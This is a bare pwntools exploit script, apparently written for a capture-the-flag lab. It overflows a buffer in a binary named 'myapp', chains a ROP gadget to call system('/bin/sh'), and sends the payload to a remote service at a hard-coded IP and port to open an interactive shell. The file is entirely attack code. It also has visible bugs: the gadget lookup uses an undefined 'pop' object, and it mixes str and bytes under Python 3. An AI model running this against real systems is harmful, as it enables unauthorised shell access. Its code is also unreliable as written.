#!/usr/bin/python3.7

from pwn import *

elf = ELF("./myapp")
rop = ROP(elf)

pop_r13_r14_r15 = (pop.find_gadget(['pop r13', 'pop r14', 'pop r15', 'ret']))[0]
test = elf.symbols['test']
system = elf.plt['system']

payload = ""
payload += "A" * 112
payload += "/bin/sh\x00"
payload += p64(pop_r13_r14_r15)
payload += p64(system)
payload += "A" * 16
payload += p64(test)

p = remote("10.10.10.147", 1337)
p.sendline(payload)
p.sendline("\n")
p.interactive()
